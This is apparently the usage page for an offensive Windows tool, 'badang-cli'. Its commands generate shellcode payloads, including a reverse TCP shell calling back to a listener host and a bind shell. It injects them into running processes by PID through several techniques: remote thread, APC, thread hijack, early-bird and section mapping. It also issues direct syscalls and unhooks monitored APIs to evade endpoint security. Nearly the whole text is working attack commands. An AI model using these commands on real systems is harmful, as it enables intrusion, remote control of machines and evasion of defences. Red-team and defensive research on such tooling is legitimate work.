# CLI Usage

Binary: `badang-cli.exe`

All commands default to dry-run mode. Add `-x -c` to run live.

## Commands

### Generate
```bash
badang-cli generate --type exec --command "calc.exe" -o payload.bin
badang-cli generate --type messagebox --title "Pwned" --text "Hello" -o msg.bin
badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
badang-cli generate --type bind_tcp --lport 4444 -o bind.bin
```

### Analyze
```bash
badang-cli analyze --pid 1234 -n          # dry run
badang-cli analyze --pid 1234 -x -c       # live scan
```

### Inject
```bash
badang-cli inject --pid 1234 --technique createremote --payload rev.bin -x -c
badang-cli inject --pid 1234 --technique apc --payload rev.bin -x -c
badang-cli inject --pid 1234 --technique hijack --payload rev.bin -x -c
badang-cli inject --technique earlybird --payload rev.bin -x -c           # no PID needed
badang-cli inject --pid 1234 --technique section --payload rev.bin -x -c
```

Techniques: `createremote`, `apc`, `hijack`, `earlybird`, `section`

### Syscall
```bash
badang-cli syscall --func NtCreateThreadEx -n
badang-cli syscall --func NtAllocateVirtualMemory -x -c
```

### Unhook
```bash
badang-cli unhook --unhook NtCreateThreadEx -x -c
```

### Convert
```bash
badang-cli convert -i "fc 48 83 e4 f0" -o payload.bin
badang-cli convert -i "\xfc\x48\x83" -o payload.bin
badang-cli convert --payload input.bin --format hex
```

### Load
```bash
badang-cli load --payload shellcode.bin
```

## Flags

| Flag | Short | Meaning |
|------|-------|---------|
| `--dry-run` | `-n` | Simulate only (default) |
| `--execute` | `-x` | Run for real |
| `--confirm` | `-c` | Required for live ops |
| `--pid` | `-p` | Target process ID |
| `--payload` | `-l` | Shellcode file |
| `--output` | `-o` | Output file |
| `--technique` | `-t` | Injection technique |
| `--func` | `-s` | Syscall function |
| `--unhook` | `-u` | API to unhook |
| `--type` | | Payload type |
| `--command` | | Command (exec) |
| `--title` | | MessageBox title |
| `--text` | | MessageBox text |
| `--lhost` | | Listener IP |
| `--lport` | | Listener port |
| `--input` | `-i` | Bytes to convert |
| `--format` | `-f` | Format: auto/hex/c/python/rust/decimal |
| `--verbose` | `-v` | Verbose output |
